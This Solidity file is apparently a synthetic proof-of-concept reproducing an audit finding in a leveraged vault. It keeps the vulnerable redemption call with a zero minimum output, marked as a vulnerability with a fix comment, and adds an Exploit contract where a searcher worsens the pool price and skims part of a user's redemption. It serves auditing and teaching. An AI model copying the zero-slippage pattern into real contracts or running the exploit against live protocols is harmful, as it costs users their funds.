// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Leveraged Vaults — PendlePrincipalToken._redeemPT has no slippage
    (Sherlock 2024-06, H-11, #35124).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: SY.redeem is called with minTokenOut hardcoded to 0. One SY share is
    not one underlying token when the SY withdraws from a pool. A searcher sets that
    pool to a worse price in the same transaction, and the vault accepts the short fill.
    The blamed call is preserved verbatim below (@> VULN).

    Repo: sherlock-audit/2024-06-leveraged-vaults
    contracts/vaults/staking/protocols/PendlePrincipalToken.sol _redeemPT. */

library Terms {
    uint256 internal constant SHARES = 1000 ether;
    uint256 internal constant MIN_OUT = 1000 ether;
    uint256 internal constant FAIR = 1 ether;
    uint256 internal constant WORSE = 0.7 ether;
    uint256 internal constant RECEIVED = 700 ether;
    uint256 internal constant SKIM = 300 ether;
    address internal constant USER = 0x000000000000000000000000000000000000bEEF;
}

contract Asset {
    string public name = "Yield Token";
    string public symbol = "TOKEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public minter;
    mapping(address => uint256) public balanceOf;

    function setMinter(address m) external {
        require(minter == address(0), "minter");
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PtToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function isExpired() external pure returns (bool) {
        return false;
    }
}

/// SY redemption pool. tokenPerSy is the underlying paid per 1e18 SY shares.
contract MockSY {
    Asset public immutable asset;
    uint256 public tokenPerSy = Terms.FAIR;
    uint256 public lastMinTokenOut;
    address public extractor;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function setTokenPerSy(uint256 rate) external {
        tokenPerSy = rate;
        extractor = msg.sender;
    }

    function quote(uint256 syIn) external view returns (uint256) {
        return syIn * tokenPerSy / 1 ether;
    }

    function redeem(
        address receiver,
        uint256 netSyToRedeem,
        address,
        uint256 minTokenOut,
        bool
    ) external returns (uint256 netTokenOut) {
        lastMinTokenOut = minTokenOut;
        netTokenOut = netSyToRedeem * tokenPerSy / 1 ether;
        require(netTokenOut >= minTokenOut, "Slippage: INSUFFICIENT_TOKEN_OUT");
        uint256 fair = netSyToRedeem;
        asset.mint(receiver, netTokenOut);
        if (fair > netTokenOut) {
            asset.mint(extractor, fair - netTokenOut);
        }
    }
}

/// PT to SY is 1:1. The price that moves is the SY pool, not this hop.
contract MockMarket {
    uint256 public lastPtIn;

    function swapExactPtForSy(address, uint256 exactPtIn, bytes calldata)
        external
        returns (uint256 netSyOut, uint256 netSyFee)
    {
        lastPtIn = exactPtIn;
        netSyOut = exactPtIn;
        netSyFee = 0;
    }
}

/// Reduced PendlePrincipalToken. _redeemPT matches the audited function.
contract PendlePrincipalToken {
    PtToken public immutable PT;
    address public immutable YT;
    MockMarket public immutable MARKET;
    MockSY public immutable SY;
    address public immutable TOKEN_OUT_SY;
    address public immutable BORROW_TOKEN;
    Asset public immutable asset;
    uint256 public ignoredMin;

    constructor(Asset _asset, PtToken _pt, MockSY _sy, MockMarket _market) {
        asset = _asset;
        PT = _pt;
        SY = _sy;
        MARKET = _market;
        YT = address(0);
        TOKEN_OUT_SY = address(_asset);
        BORROW_TOKEN = address(_asset);
    }

    function getStakingTokensForVaultShare(uint256 vaultShares) public pure returns (uint256) {
        return vaultShares;
    }

    /// @notice Handles PT redemption whether it is expired or not
    function _redeemPT(uint256 vaultShares) internal returns (uint256 netTokenOut) {
        uint256 netPtIn = getStakingTokensForVaultShare(vaultShares);
        uint256 netSyOut;

        // PT tokens are known to be ERC20 compatible
        if (PT.isExpired()) {
            PT.transfer(address(YT), netPtIn);
            netSyOut = netPtIn;
        } else {
            PT.transfer(address(MARKET), netPtIn);
            (netSyOut,) = MARKET.swapExactPtForSy(address(SY), netPtIn, "");
        }

        // @> VULN: minTokenOut is hardcoded to 0, so a worse SY pool price is accepted
        netTokenOut = SY.redeem(address(this), netSyOut, TOKEN_OUT_SY, 0, true);
        // FIX: pass the caller's minimum and revert when the SY pool pays less.
    }

    function executeInstantRedemption(address account, uint256 vaultShares, uint256 minPurchaseAmount)
        external
        returns (uint256 borrowedCurrencyAmount)
    {
        uint256 netTokenOut = _redeemPT(vaultShares);

        if (TOKEN_OUT_SY != BORROW_TOKEN) {
            borrowedCurrencyAmount = 0;
        } else {
            ignoredMin = minPurchaseAmount;
            borrowedCurrencyAmount = netTokenOut;
            asset.transfer(account, borrowedCurrencyAmount);
        }
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    PtToken public pt; // CREATE nonce 2
    MockSY public sy; // CREATE nonce 3
    MockMarket public market; // CREATE nonce 4
    PendlePrincipalToken public vault; // CREATE nonce 5

    constructor() {
        asset = new Asset();
        pt = new PtToken();
        sy = new MockSY(asset);
        market = new MockMarket();
        vault = new PendlePrincipalToken(asset, pt, sy, market);
        pt.mint(address(vault), Terms.SHARES);
        asset.setMinter(address(sy));
    }

    function run() external {
        uint256 minOut = Terms.MIN_OUT;
        uint256 fair = sy.quote(Terms.SHARES);
        require(fair == minOut, "fair quote");
        require(sy.tokenPerSy() == Terms.FAIR, "pool starts fair");

        sy.setTokenPerSy(Terms.WORSE);
        require(sy.tokenPerSy() == Terms.WORSE, "pool worsened");

        uint256 got = vault.executeInstantRedemption(Terms.USER, Terms.SHARES, minOut);

        uint256 userBal = asset.balanceOf(Terms.USER);
        uint256 skim = asset.balanceOf(address(this));
        require(sy.lastMinTokenOut() == 0, "min was not zero");
        require(got == Terms.RECEIVED, "short fill");
        require(userBal == Terms.RECEIVED, "user balance");
        require(userBal < minOut, "stated minimum was not enforced");
        require(minOut - userBal == Terms.SKIM, "gap");
        require(skim == Terms.SKIM, "searcher did not take the gap");
        require(vault.ignoredMin() == minOut, "caller minimum ignored");
        require(market.lastPtIn() == Terms.SHARES, "pt in");
    }
}
